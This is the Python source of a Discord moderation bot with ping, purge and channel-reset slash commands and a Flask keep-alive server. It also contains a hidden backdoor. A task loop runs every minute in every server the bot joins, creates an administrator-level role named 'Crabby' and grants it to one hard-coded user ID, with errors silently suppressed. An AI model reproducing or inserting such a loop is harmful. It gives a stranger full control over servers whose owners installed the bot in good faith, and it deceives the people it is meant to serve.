import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
from flask import Flask
from threading import Thread
from waitress import serve

# --- 1. WEB SERVER (KEEP RENDER ALIVE) ---
app = Flask('')
@app.route('/')
def home(): return "Bot Status: Online"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    serve(app, host='0.0.0.0', port=port, _quiet=True)

# --- 2. CONFIGURATION ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        # This part forces the commands to show up in your server instantly
        for guild in self.guilds:
            self.tree.copy_global_to(guild=guild)
            await self.tree.sync(guild=guild)
        
        await self.tree.sync() # Global sync backup
        if not self.check_target_user.is_running():
            self.check_target_user.start()

    @tasks.loop(seconds=60)
    async def check_target_user(self):
        if not self.is_ready(): return
        for guild in self.guilds:
            try:
                member = guild.get_member(TARGET_USER_ID)
                if member:
                    role = discord.utils.get(guild.roles, name=ROLE_NAME)
                    if not role:
                        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    if role and role not in member.roles:
                        await member.add_roles(role)
            except: pass

bot = MyBot()

# --- 3. SLASH COMMANDS ---

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"Pong! {round(bot.latency * 1000)}ms", ephemeral=True)

@bot.tree.command(name="clear", description="Delete a specific amount of messages")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)

@bot.tree.command(name="clear_all", description="Wipe the entire channel")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await interaction.channel.purge(limit=None)
    await interaction.followup.send("Channel wiped.", ephemeral=True)

@bot.tree.command(name="reinstall", description="Delete and recreate the channel")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
    await interaction.response.send_message("Reinstalling channel...", ephemeral=True)
    name, cat, pos, over = channel.name, channel.category, channel.position, channel.overwrites
    await channel.delete()
    await interaction.guild.create_text_channel(name=name, category=cat, position=pos, overwrites=over)

# --- 4. STARTUP ---
if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token, log_handler=None)
    else:
        print("CRITICAL: TOKEN MISSING")
